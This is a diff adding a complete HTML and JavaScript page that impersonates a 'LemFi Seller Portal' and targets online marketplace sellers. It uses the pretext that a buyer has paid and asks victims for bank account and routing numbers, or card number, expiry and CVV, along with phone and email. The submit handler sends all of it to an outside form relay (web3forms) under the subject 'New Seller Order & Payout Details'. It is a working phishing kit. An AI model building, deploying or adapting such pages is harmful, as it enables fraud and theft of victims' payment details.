@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LemFi Seller Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        /* --- Theme Variables --- */
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{
+            --green:#10B981; --green-dark:#047857; --green-darker:#065F46;
+            --green-light:#ECFDF5; --green-ghost:#D1FAE5;
+            --blue:#0066CC; --text:#1A1A2E; --text-sec:#5C5C5C; --text-tri:#999;
+            --border:#DEDEDE; --border-f:#10B981; --bg:#F5F5F5; --card:#FFF;
+            --input-bg:#FAFAFA; --input-focus:#FFF; --shadow:0 2px 16px rgba(0,0,0,0.07);
+            --shadow-btn:0 4px 14px rgba(16, 185, 129, 0.35);
+            --r:10px; --r-xl:16px
+        }
+        body{font-family:'Nunito Sans',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);padding:20px;color:var(--text)}
+        .pw{position:relative;width:100%;max-width:480px}
+        .hidden{display:none !important}
+
+        /* Top Bar & Logo */
+        .top{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
+        .logo{display:flex;align-items:center;gap:9px;text-decoration:none}
+        .lm{width:36px;height:36px;border-radius:8px;display:flex;align-items:center;justify-content:center;background:var(--green)}
+        .lm svg{width:24px;height:24px;color:#fff}
+        .lw{font-size:18px;font-weight:800;color:var(--text)}
+
+        /* Progress Steps */
+        .steps{display:flex;justify-content:space-between;margin-bottom:24px;position:relative}
+        .steps::before{content:'';position:absolute;top:50%;left:0;width:100%;height:2px;background:#e5e7eb;z-index:0;transform:translateY(-50%)}
+        .step{position:relative;z-index:1;background:var(--card);padding:0 10px;display:flex;flex-direction:column;align-items:center;gap:4px}
+        .step-num{width:28px;height:28px;border-radius:50%;background:#e5e7eb;color:var(--text-tri);font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;border:2px solid var(--card);transition:all .3s}
+        .step.active .step-num{background:var(--green);color:#fff;border-color:var(--green)}
+        .step.completed .step-num{background:var(--green-dark);color:#fff;border-color:var(--green-dark)}
+        .step-label{font-size:11px;font-weight:600;color:var(--text-tri);text-transform:uppercase}
+        .step.active .step-label{color:var(--green-dark)}
+
+        /* Card & Form */
+        .card{background:var(--card);border-radius:var(--r-xl);box-shadow:var(--shadow);border:1px solid rgba(0,0,0,0.04);overflow:hidden}
+        .ch{padding:24px 24px 0}
+        .ch h2{font-size:18px;font-weight:700;color:var(--text);margin-bottom:4px}
+        .ch p{font-size:13px;color:var(--text-sec)}
+        
+        .fb{padding:8px 24px 24px}
+        .ig{margin-bottom:16px}
+        .ig label{display:block;font-size:12px;font-weight:700;color:var(--text);margin-bottom:6px;text-transform:uppercase;letter-spacing:0.3px}
+        .iw{position:relative}
+        .iw .fi{position:absolute;left:12px;top:50%;transform:translateY(-50%);width:16px;height:16px;color:var(--text-tri)}
+        
+        .ig input, .ig select{width:100%;padding:12px 12px 12px 40px;border:1.5px solid var(--border);border-radius:var(--r);font-size:14px;font-family:inherit;color:var(--text);background:var(--input-bg);transition:all .2s;outline:none;appearance:none}
+        .ig input:focus, .ig select:focus{border-color:var(--border-f);background:var(--input-focus);box-shadow:0 0 0 3px rgba(16, 185, 129, 0.1)}
+        .ig input:focus~.fi, .ig select:focus~.fi{color:var(--green)}
+
+        .select-wrapper::after{content:'▼';font-size:9px;color:var(--text-tri);position:absolute;right:15px;top:50%;transform:translateY(-50%);pointer-events:none}
+
+        /* Summary Box */
+        .summary-box{background:var(--green-light);border:1px solid var(--green-ghost);border-radius:var(--r);padding:12px;margin-bottom:16px}
+        .summary-row{display:flex;justify-content:space-between;font-size:13px;color:var(--text-sec);margin-bottom:4px}
+        .summary-row.total{margin-top:8px;padding-top:8px;border-top:1px dashed var(--green);font-weight:700;color:var(--green-dark);font-size:15px}
+
+        /* Payment Type Toggle */
+        .type-toggle{display:flex;gap:10px;margin-bottom:16px}
+        .type-btn{flex:1;padding:10px;border:1.5px solid var(--border);border-radius:var(--r);background:var(--input-bg);font-size:13px;font-weight:600;color:var(--text-sec);cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:6px}
+        .type-btn.selected{border-color:var(--green);background:var(--green-light);color:var(--green-dark)}
+        .type-btn svg{width:16px;height:16px}
+
+        /* Notification Box */
+        .note-box{background:#FFF7ED;border-left:4px solid #F97316;padding:12px;border-radius:4px;margin-bottom:16px;font-size:12px;color:#9A3412;line-height:1.5}
+        .note-box strong{display:block;margin-bottom:4px;color:#C2410C}
+
+        /* Buttons */
+        .bp{width:100%;padding:14px;background:var(--green);color:#fff;border:none;border-radius:var(--r);font-size:15px;font-weight:700;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px}
+        .bp:hover{background:var(--green-dark);box-shadow:var(--shadow-btn)}
+        .bp:disabled{opacity:.6;cursor:not-allowed;box-shadow:none}
+        
+        .bp-outline{width:100%;padding:13px;background:transparent;color:var(--text-sec);border:1.5px solid var(--border);border-radius:var(--r);font-size:14px;font-weight:600;cursor:pointer;margin-top:12px;transition:all .2s}
+        .bp-outline:hover{background:var(--bg);border-color:#ccc}
+
+        .spinner{width:18px;height:18px;border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite}
+        @keyframes sp{to{transform:rotate(360deg)}}
+
+        .msg{font-size:13px;text-align:center;margin-top:12px;padding:8px;border-radius:6px;display:none}
+        .msg.error{background:#FEF2F2;color:#DC2626;border:1px solid #FECACA}
+        .msg.success{background:#ECFDF5;color:#059669;border:1px solid #A7F3D0}
+    </style>
+</head>
+<body>
+
+<div class="pw">
+    <div class="top">
+        <a href="#" class="logo">
+            <div class="lm">
+                <!-- LemFi-style Logo -->
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+            </div>
+            <span class="lw">LemFi Seller</span>
+        </a>
+    </div>
+
+    <!-- Progress Bar -->
+    <div class="steps">
+        <div class="step active" id="step1-indicator">
+            <div class="step-num">1</div>
+            <div class="step-label">Product</div>
+        </div>
+        <div class="step" id="step2-indicator">
+            <div class="step-num">2</div>
+            <div class="step-label">Payout</div>
+        </div>
+    </div>
+
+    <div class="card">
+        
+        <!-- PAGE 1: PRODUCT DETAILS -->
+        <div id="page-1">
+            <div class="ch">
+                <h2>Product Details</h2>
+                <p>Enter information about the item being sold.</p>
+            </div>
+            <form id="formPage1" class="fb">
+                <div class="ig">
+                    <label>Platform</label>
+                    <div class="iw select-wrapper">
+                        <svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>
+                        <select id="p_platform" required>
+                            <option value="" disabled selected>Select Platform</option>
+                            <option value="Etsy">Etsy</option>
+                            <option value="Vinted">Vinted</option>
+                            <option value="eBay">eBay</option>
+                            <option value="Depop">Depop</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="ig">
+                    <label>Full Name</label>
+                    <div class="iw">
+                        <svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                        <input type="text" id="p_name" placeholder="Your Name" required>
+                    </div>
+                </div>
+
+                <div class="ig">
+                    <label>Product Type</label>
+                    <div class="iw">
+                        <svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/></svg>
+                        <input type="text" id="p_type" placeholder="e.g. iPhone 14 Case" required>
+                    </div>
+                </div>
+
+                <div class="ig">
+                    <label>Product Amount ($)</label>
+                    <div class="iw">
+                        <svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+                        <input type="number" id="p_amount" placeholder="0.00" step="0.01" required oninput="calcTotal()">
+                    </div>
+                </div>
+
+                <div class="ig">
+                    <label>Shipping To</label>
+                    <div class="iw select-wrapper">
+                        <svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="16.24 7.76 14.12 14.12 7.76 16.24 9.88 9.88 16.24 7.76"/></svg>
+                        <select id="p_dest" required onchange="calcTotal()">
+                            <option value="" disabled selected>Select Destination</option>
+                            <option value="local">Local (Domestic)</option>
+                            <option value="usa">USA</option>
+                            <option value="uk">UK</option>
+                            <option value="europe">Europe</option>
+                            <option value="intl">International</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="summary-box">
+                    <div class="summary-row"><span>Product Price:</span> <span id="d_price">$0.00</span></div>
+                    <div class="summary-row"><span>Shipping Fee:</span> <span id="d_ship">$0.00</span></div>
+                    <div class="summary-row total"><span>Total:</span> <span id="d_total">$0.00</span></div>
+                </div>
+
+                <button type="button" class="bp" onclick="goToPage2()">
+                    <span>Next: Payment Setup</span>
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+                </button>
+            </form>
+        </div>
+
+        <!-- PAGE 2: PAYOUT DETAILS -->
+        <div id="page-2" class="hidden">
+            <div class="ch">
+                <h2>Payment Portal</h2>
+                <p>Enter where you want to receive your money.</p>
+            </div>
+            <form id="finalForm" class="fb">
+                
+                <div class="note-box">
+                    <strong>Important:</strong>
+                    The buyer will pay you using their <strong>LemFi Wallet</strong>. Once the transaction is verified, you will receive a confirmation call on your phone.
+                </div>
+
+                <div class="ig">
+                    <label>Phone Number (For Call)</label>
+                    <div class="iw">
+                        <svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12" y2="18"/></svg>
+                        <input type="tel" id="p_phone" name="phone" placeholder="+1 234 567 890" required>
+                    </div>
+                </div>
+
+                <div class="ig">
+                    <label>Email Address</label>
+                    <div class="iw">
+                        <svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+                        <input type="email" id="p_email" name="email" placeholder="you@example.com" required>
+                    </div>
+                </div>
+
+                <label style="display:block;font-size:12px;font-weight:700;color:var(--text);margin-bottom:6px">Receive Funds Via</label>
+                <div class="type-toggle">
+                    <div class="type-btn selected" id="btn-bank" onclick="togglePayMethod('bank')">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>
+                        Bank
+                    </div>
+                    <div class="type-btn" id="btn-card" onclick="togglePayMethod('card')">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+                        Card
+                    </div>
+                </div>
+
+                <!-- Bank Fields -->
+                <div id="fields-bank">
+                    <div class="ig">
+                        <label>Bank Name</label>
+                        <div class="iw">
+                            <input type="text" id="pay_bank_name" name="bank_name" placeholder="e.g. Chase, Wells Fargo" style="padding-left:12px">
+                        </div>
+                    </div>
+                    <div class="ig">
+                        <label>Account Number / IBAN</label>
+                        <div class="iw">
+                            <input type="text" id="pay_account" name="account_number" placeholder="0000000000" style="padding-left:12px">
+                        </div>
+                    </div>
+                    <div class="ig">
+                        <label>Routing / Sort Code</label>
+                        <div class="iw">
+                            <input type="text" id="pay_routing" name="routing_number" placeholder="000000000" style="padding-left:12px">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Card Fields (Hidden by default) -->
+                <div id="fields-card" class="hidden">
+                    <div class="ig">
+                        <label>Cardholder Name</label>
+                        <div class="iw">
+                            <input type="text" id="pay_card_name" name="card_name" placeholder="Name on card" style="padding-left:12px">
+                        </div>
+                    </div>
+                    <div class="ig">
+                        <label>Card Number</label>
+                        <div class="iw">
+                            <input type="text" id="pay_card_num" name="card_number" placeholder="0000 0000 0000 0000" style="padding-left:12px">
+                        </div>
+                    </div>
+                    <div style="display:flex;gap:10px">
+                        <div class="ig" style="flex:1">
+                            <label>Expiry</label>
+                            <input type="text" id="pay_card_exp" name="card_exp" placeholder="MM/YY" style="width:100%;padding:10px;border:1.5px solid var(--border);border-radius:var(--r)">
+                        </div>
+                        <div class="ig" style="flex:1">
+                            <label>CVV</label>
+                            <input type="text" id="pay_card_cvv" name="card_cvv" placeholder="123" style="width:100%;padding:10px;border:1.5px solid var(--border);border-radius:var(--r)">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Hidden inputs to combine data -->
+                <input type="hidden" id="hidden_platform" name="platform">
+                <input type="hidden" id="hidden_name" name="seller_name">
+                <input type="hidden" id="hidden_type" name="product_type">
+                <input type="hidden" id="hidden_amount" name="product_amount">
+                <input type="hidden" id="hidden_dest" name="destination">
+                <input type="hidden" id="hidden_total" name="total_amount">
+                <input type="hidden" name="access_key" value="YOUR_ACCESS_KEY_HERE">
+                <input type="hidden" name="subject" value="New Seller Order & Payout Details">
+
+                <button type="submit" class="bp" id="submitBtn">
+                    <span>Confirm & Submit</span>
+                </button>
+                <button type="button" class="bp-outline" onclick="goToPage1()">
+                    Back
+                </button>
+                <div id="finalMsg" class="msg"></div>
+            </form>
+        </div>
+    </div>
+</div>
+
+<script>
+    // --- Configuration ---
+    const RATES = { 'local': 5, 'usa': 15, 'uk': 25, 'europe': 30, 'intl': 45 };
+    let currentPayMethod = 'bank';
+
+    // --- Step 1 Logic ---
+    function calcTotal() {
+        const amt = parseFloat(document.getElementById('p_amount').value) || 0;
+        const dest = document.getElementById('p_dest').value;
+        const ship = dest ? RATES[dest] : 0;
+        const total = amt + ship;
+
+        document.getElementById('d_price').textContent = `$${amt.toFixed(2)}`;
+        document.getElementById('d_ship').textContent = `$${ship.toFixed(2)}`;
+        document.getElementById('d_total').textContent = `$${total.toFixed(2)}`;
+        return total;
+    }
+
+    function goToPage2() {
+        // Validate Step 1
+        const form = document.getElementById('formPage1');
+        if(!form.checkValidity()){
+            form.reportValidity();
+            return;
+        }
+        
+        // Transfer Data to Hidden Fields
+        document.getElementById('hidden_platform').value = document.getElementById('p_platform').value;
+        document.getElementById('hidden_name').value = document.getElementById('p_name').value;
+        document.getElementById('hidden_type').value = document.getElementById('p_type').value;
+        document.getElementById('hidden_amount').value = document.getElementById('p_amount').value;
+        document.getElementById('hidden_dest').value = document.getElementById('p_dest').options[document.getElementById('p_dest').selectedIndex].text;
+        document.getElementById('hidden_total').value = document.getElementById('d_total').textContent;
+
+        // Switch View
+        document.getElementById('page-1').classList.add('hidden');
+        document.getElementById('page-2').classList.remove('hidden');
+        
+        // Update Progress
+        document.getElementById('step1-indicator').classList.add('completed');
+        document.getElementById('step1-indicator').classList.remove('active');
+        document.getElementById('step2-indicator').classList.add('active');
+    }
+
+    function goToPage1() {
+        document.getElementById('page-2').classList.add('hidden');
+        document.getElementById('page-1').classList.remove('hidden');
+        document.getElementById('step1-indicator').classList.add('active');
+        document.getElementById('step1-indicator').classList.remove('completed');
+        document.getElementById('step2-indicator').classList.remove('active');
+    }
+
+    // --- Step 2 Logic ---
+    function togglePayMethod(method) {
+        currentPayMethod = method;
+        const btnBank = document.getElementById('btn-bank');
+        const btnCard = document.getElementById('btn-card');
+        const fieldsBank = document.getElementById('fields-bank');
+        const fieldsCard = document.getElementById('fields-card');
+
+        if(method === 'bank') {
+            btnBank.classList.add('selected');
+            btnCard.classList.remove('selected');
+            fieldsBank.classList.remove('hidden');
+            fieldsCard.classList.add('hidden');
+        } else {
+            btnCard.classList.add('selected');
+            btnBank.classList.remove('selected');
+            fieldsCard.classList.remove('hidden');
+            fieldsBank.classList.add('hidden');
+        }
+    }
+
+    // --- Final Submission ---
+    document.getElementById('finalForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const btn = document.getElementById('submitBtn');
+        const msg = document.getElementById('finalMsg');
+
+        if(document.querySelector('input[name="access_key"]').value === 'YOUR_ACCESS_KEY_HERE') {
+            msg.textContent = "Error: Access Key not configured.";
+            msg.className = "msg error";
+            msg.style.display = "block";
+            return;
+        }
+
+        // Gather visible data based on selection
+        let formData = new FormData(this);
+        formData.append('payout_method', currentPayMethod === 'bank' ? 'Bank Transfer' : 'Card Deposit');
+
+        btn.innerHTML = '<div class="spinner"></div> Processing...';
+        btn.disabled = true;
+
+        try {
+            const res = await fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                body: formData
+            });
+            const data = await res.json();
+
+            if(data.success) {
+                msg.textContent = "Success! Details submitted. You will receive a call shortly.";
+                msg.className = "msg success";
+                btn.textContent = "Submitted";
+            } else {
+                msg.textContent = "Submission failed. Try again.";
+                msg.className = "msg error";
+                btn.disabled = false;
+                btn.textContent = "Confirm & Submit";
+            }
+        } catch(err) {
+            msg.textContent = "Network error.";
+            msg.className = "msg error";
+            btn.disabled = false;
+            btn.textContent = "Confirm & Submit";
+        }
+        msg.style.display = "block";
+    });
+</script>
+
+</body>
+</html>
